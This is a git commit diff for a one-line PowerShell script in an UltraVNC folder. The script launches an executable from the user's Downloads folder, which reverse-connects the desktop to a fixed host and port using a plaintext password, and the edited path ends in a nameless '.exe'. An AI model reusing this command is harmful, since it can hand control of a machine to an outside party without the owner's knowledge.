8a35850c0797cb0a018ef705df849f2d6842e93e
Cocotjuhh <155767892+Cocotjuhh@users.noreply.github.com>
2024-11-18 12:00:31 +0100

    Update Ultravnc3.ps1

--- Win/ultravnc/Ultravnc3.ps1
+++ Win/ultravnc/Ultravnc3.ps1
@@ -1,1 +1,1 @@
-Start-Process "$$env:USERPROFILE\Downloads\File.exe" -ArgumentList "-connect 192.168.178.214:5500 -password Zhuan2010!"
+Start-Process "$env:USERPROFILE\Downloads\.exe" -ArgumentList "-connect 192.168.178.214:5500 -password Zhuan2010!"
